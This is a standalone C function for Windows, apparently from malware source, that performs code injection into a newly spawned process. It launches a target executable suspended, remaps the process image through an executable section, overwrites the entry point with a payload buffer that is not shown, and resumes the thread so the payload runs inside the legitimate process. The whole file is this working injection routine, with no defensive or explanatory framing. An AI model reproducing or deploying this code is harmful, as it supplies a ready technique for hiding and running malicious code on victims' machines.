BOOL InjectPayload(
	LPTSTR lpTargetModule
	)
{
	BOOL						result = FALSE;
	PROCESS_BASIC_INFORMATION	pbi;
	PROCESS_INFORMATION			pinf;
	STARTUPINFO					stinf;
	LPVOID						ImageBase, LocalBase;
	HANDLE						hFile, hSection;
	PIMAGE_DOS_HEADER			dosh;
	PIMAGE_FILE_HEADER			fileh;
	PIMAGE_OPTIONAL_HEADER		popth;
	PIMAGE_SECTION_HEADER		sections;
	LPVOID						Payload;
	SIZE_T						bytesAlloc;
	ULONG						c, rsize;
	LARGE_INTEGER				sec_sz;
	NTSTATUS					Status;

	__try {

		hSection = NULL;
		memset(&stinf, 0, sizeof(stinf));
		stinf.cb = sizeof(stinf);
		//GetStartupInfo(&stinf);
		pinf.hProcess = 0;
		pinf.hThread = 0;
		
		SetLastError(0);
		hFile = CreateFile(lpTargetModule, FILE_READ_DATA | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if ( hFile == INVALID_HANDLE_VALUE ) {
			wsprintfA(errmsg, "CreateFile fail u", GetLastError());
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		bytesAlloc = GetFileSize(hFile, NULL);
		Payload = HeapAlloc(GetProcessHeap(), 0, bytesAlloc);
		if ( Payload == NULL ) {
			wsprintfA(errmsg, "HeapAlloc fail u", GetLastError());
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		if ( !ReadFile(hFile, Payload, (DWORD)bytesAlloc, &c, NULL) ) {

			wsprintfA(errmsg, "ReadFile fail u", GetLastError());
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;

		}
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;

		dosh = (PIMAGE_DOS_HEADER)Payload;
		fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
		popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
		sections = (PIMAGE_SECTION_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER) + fileh->SizeOfOptionalHeader);
		sec_sz.QuadPart = popth->SizeOfImage;

		Status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sec_sz, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if (!NT_SUCCESS(Status)) {
			wsprintfA(errmsg, "NtCreateSection fail 0x%x", Status);
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		SetLastError(0);
		if ( !CreateProcess(NULL, lpTargetModule, NULL, NULL, FALSE, 
			CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS, NULL, NULL, &stinf, &pinf) ) 
		{
			wsprintfA(errmsg, "CreateProcess fail u", GetLastError());
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		Status = NtQueryInformationProcess(pinf.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &rsize);
		if (!NT_SUCCESS(Status)) {
			wsprintfA(errmsg, "NtQueryInformationProcess fail 0x%x", Status);
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		 
		if (!ReadProcessMemory(pinf.hProcess, (BYTE *)pbi.PebBaseAddress + 8, &ImageBase, sizeof(PVOID), &rsize)) {
			wsprintfA(errmsg, "ReadProcessMemory fail 0x%x", GetLastError());
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		bytesAlloc = popth->SizeOfImage;
		LocalBase = NULL;

		Status = NtMapViewOfSection(hSection, NtCurrentProcess(), &LocalBase, 0, popth->SizeOfImage, NULL, &bytesAlloc, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(Status)) {
			wsprintfA(errmsg, "NtMapViewOfSection fail 0x%x", Status);
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		if (ReadProcessMemory(pinf.hProcess, ImageBase, LocalBase, popth->SizeOfImage, &rsize) != 1) {
			wsprintfA(errmsg, "ReadProcessMemory fail 0x%x", GetLastError());
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		Status = NtUnmapViewOfSection(pinf.hProcess, ImageBase);
		if (!NT_SUCCESS(Status)) {
			wsprintfA(errmsg, "NtUnmapViewOfSection fail 0x%x", Status);
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		bytesAlloc = popth->SizeOfImage;
		Status = NtMapViewOfSection(hSection, pinf.hProcess, &ImageBase, 0, 
			popth->SizeOfImage, NULL, &bytesAlloc, ViewShare, 0, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(Status)) {
			wsprintfA(errmsg, "NtMapViewOfSection fail 0x%x", Status);
			DbgMsg(__FILE__, __LINE__, errmsg);
			__leave;
		}

		memcpy((PBYTE)LocalBase + popth->AddressOfEntryPoint, data, sizeof(data));
		ResumeThread(pinf.hThread);
		result = TRUE;

	} __finally {
		if (hSection != NULL) 
			NtClose(hSection);
		if (pinf.hProcess != NULL)
			CloseHandle(pinf.hProcess);
		if (pinf.hThread != NULL)
			CloseHandle(pinf.hThread);
		if (hFile !=  INVALID_HANDLE_VALUE)
			CloseHandle(hFile);
		if (Payload != NULL)
			HeapFree(GetProcessHeap(), 0, Payload);
	
	}
	return result;
}

